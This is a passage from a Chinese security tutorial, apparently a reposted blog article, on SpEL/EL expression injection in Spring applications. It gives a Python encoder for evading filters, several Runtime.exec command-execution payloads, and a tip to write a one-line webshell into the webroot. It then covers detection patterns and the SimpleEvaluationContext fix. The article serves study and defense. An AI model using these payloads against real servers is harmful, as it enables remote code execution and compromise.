20px;">8</span><br/><span style="height: 20px;line-height: 20px;">9</span><br/><span style="height: 20px;line-height: 20px;">10</span><br/><span style="height: 20px;line-height: 20px;">11</span><br/><span style="height: 20px;line-height: 20px;">12</span><br/><span style="height: 20px;line-height: 20px;">13</span><br/><span style="height: 20px;line-height: 20px;">14</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;">message = input(<span style="color: rgb(26, 188, 156);">&#39;Enter message to encode:&#39;</span>)</span><br/><span style="height: 20px;line-height: 20px;"> </span><br/><span style="height: 20px;line-height: 20px;">print(<span style="color: rgb(26, 188, 156);">&#39;Decoded string (in ASCII):\n&#39;</span>)</span><br/><span style="height: 20px;line-height: 20px;"> </span><br/><span style="height: 20px;line-height: 20px;">print(<span style="color: rgb(26, 188, 156);">&#39;T(java.lang.Character).toString(%s)&#39;</span> % ord(message[<span style="color: rgb(174, 129, 255);">0</span>]), end=<span style="color: rgb(26, 188, 156);">&#34;&#34;</span>)</span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(233, 105, 0);">for</span> ch <span style="color: rgb(233, 105, 0);">in</span> message[<span style="color: rgb(174, 129, 255);">1</span>:]:</span><br/><span style="height: 20px;line-height: 20px;">   print(<span style="color: rgb(26, 188, 156);">&#39;.concat(T(java.lang.Character).toString(%s))&#39;</span> % ord(ch), end=<span style="color: rgb(26, 188, 156);">&#34;&#34;</span>), </span><br/><span style="height: 20px;line-height: 20px;">print(<span style="color: rgb(26, 188, 156);">&#39;\n&#39;</span>)</span><br/><span style="height: 20px;line-height: 20px;"> </span><br/><span style="height: 20px;line-height: 20px;">print(<span style="color: rgb(26, 188, 156);">&#39;new java.lang.String(new byte[]{&#39;</span>, end=<span style="color: rgb(26, 188, 156);">&#34;&#34;</span>),</span><br/><span style="height: 20px;line-height: 20px;">print(ord(message[<span style="color: rgb(174, 129, 255);">0</span>]), end=<span style="color: rgb(26, 188, 156);">&#34;&#34;</span>)</span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(233, 105, 0);">for</span> ch <span style="color: rgb(233, 105, 0);">in</span> message[<span style="color: rgb(174, 129, 255);">1</span>:]:</span><br/><span style="height: 20px;line-height: 20px;">   print(<span style="color: rgb(26, 188, 156);">&#39;,%s&#39;</span> % ord(ch), end=<span style="color: rgb(26, 188, 156);">&#34;&#34;</span>), </span><br/><span style="height: 20px;line-height: 20px;">print(<span style="color: rgb(26, 188, 156);">&#39;)}&#39;</span>)</span><br/></pre></td></tr></tbody></table>  
其他的一些payload：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/><span style="height: 20px;line-height: 20px;">3</span><br/><span style="height: 20px;line-height: 20px;">4</span><br/><span style="height: 20px;line-height: 20px;">5</span><br/><span style="height: 20px;line-height: 20px;">6</span><br/><span style="height: 20px;line-height: 20px;">7</span><br/><span style="height: 20px;line-height: 20px;">8</span><br/><span style="height: 20px;line-height: 20px;">9</span><br/><span style="height: 20px;line-height: 20px;">10</span><br/><span style="height: 20px;line-height: 20px;">11</span><br/><span style="height: 20px;line-height: 20px;">12</span><br/><span style="height: 20px;line-height: 20px;">13</span><br/><span style="height: 20px;line-height: 20px;">14</span><br/><span style="height: 20px;line-height: 20px;">15</span><br/><span style="height: 20px;line-height: 20px;">16</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;">// 转自：https://www.jianshu.com/p/ce4ac733a4b9</span><br/><span style="height: 20px;line-height: 20px;"></span><br/><span style="height: 20px;line-height: 20px;">${pageContext} 对应于JSP页面中的pageContext对象（注意：取的是pageContext对象。）</span><br/><br/><span style="height: 20px;line-height: 20px;">${pageContext.getSession().getServletContext().getClassLoader().getResource(&#34;&#34;)}   获取web路径</span><br/><br/><span style="height: 20px;line-height: 20px;">${header}  文件头参数</span><br/><br/><span style="height: 20px;line-height: 20px;">${applicationScope} 获取webRoot</span><br/><br/><span style="height: 20px;line-height: 20px;">${pageContext.request.getSession().setAttribute(&#34;a&#34;,pageContext.request.getClass().forName(&#34;java.lang.Runtime&#34;).getMethod(&#34;getRuntime&#34;,null).invoke(null,null).exec(&#34;命令&#34;).getInputStream())}  执行命令</span><br/><br/><br/><span style="height: 20px;line-height: 20px;">// 渗透思路：获取webroot路径，exec执行命令echo写入一句话。</span><br/><br/><span style="height: 20px;line-height: 20px;">&lt;p th:text=&#34;${#this.getClass().forName(&#39;java.lang.System&#39;).getProperty(&#39;user.dir&#39;)}&#34;&gt;&lt;/p&gt;   //获取web路径</span><br/></pre></td></tr></tbody></table>## 0x03 检测与防御  
### 检测方法  
  
全局搜索关键特征：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/><span style="height: 20px;line-height: 20px;">3</span><br/><span style="height: 20px;line-height: 20px;">4</span><br/><span style="height: 20px;line-height: 20px;">5</span><br/><span style="height: 20px;line-height: 20px;">6</span><br/><span style="height: 20px;line-height: 20px;">7</span><br/><span style="height: 20px;line-height: 20px;">8</span><br/><span style="height: 20px;line-height: 20px;">9</span><br/><span style="height: 20px;line-height: 20px;">10</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;"><span style="color: rgb(179, 179, 179);">//关键类</span></span><br/><span style="height: 20px;line-height: 20px;">org.springframework.expression.Expression</span><br/><span style="height: 20px;line-height: 20px;">org.springframework.expression.ExpressionParser</span><br/><span style="height: 20px;line-height: 20px;">org.springframework.expression.spel.standard.SpelExpressionParser</span><br/><span style="height: 20px;line-height: 20px;"></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(179, 179, 179);">//调用特征</span></span><br/><span style="height: 20px;line-height: 20px;">ExpressionParser parser = <span style="color: rgb(233, 105, 0);">new</span> SpelExpressionParser();</span><br/><span style="height: 20px;line-height: 20px;">Expression expression = parser.parseExpression(str);</span><br/><span style="height: 20px;line-height: 20px;">expression.getValue()</span><br/><span style="height: 20px;line-height: 20px;">expression.setValue()</span><br/></pre></td></tr></tbody></table>### 防御方法  
  
最直接的修复方法是使用SimpleEvaluationContext替换StandardEvaluationContext。  
  
官方文档：https://docs.spring.io/spring/docs/5.0.6.RELEASE/javadoc-api/org/springframework/expression/spel/support/SimpleEvaluationContext.html  
  
Demo：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/><span style="height: 20px;line-height: 20px;">3</span><br/><span style="height: 20px;line-height: 20px;">4</span><br/><span style="height: 20px;line-height: 20px;">5</span><br/><span style="height: 20px;line-height: 20px;">6</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;">String spel = <span style="color: rgb(26, 188, 156);">&#34;T(java.lang.Runtime).getRuntime().exec(\&#34;calc\&#34;)&#34;</span>;</span><br/><span style="height: 20px;line-height: 20px;">ExpressionParser parser = <span style="color: rgb(233, 105, 0);">new</span> SpelExpressionParser();</span><br/><span style="height: 20px;line-height: 20px;">Student student = <span style="color: rgb(233, 105, 0);">new</span> Student();</span><br/><span style="height: 20px;line-height: 20px;">EvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().withRootObject(student).build();</span><br/><span style="height: 20px;line-height: 20px;">Expression expression = parser.parseExpression(spel);</span><br/><span style="height: 20px;line-height: 20px;">System.out.println(expression.getValue(context));</span><br/></pre></td></tr></tbody></table>## 0x04 参考  
  
由浅入深SpEL表达式注入漏洞  
  
SpEL表达式  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
   
点击下方小卡片或扫描下方二维码观看更多**技术文章**  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/3ZX4O1QxGtNugz59dONCI9VFaRVRJ1PnwrFy5cAnhjZht6N5nFrjQ8liajKbqnQevqdjn9jlepoUic6ybZVL8Nibw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**师傅们点赞、转发、在看就是最大的支持**  
  
  
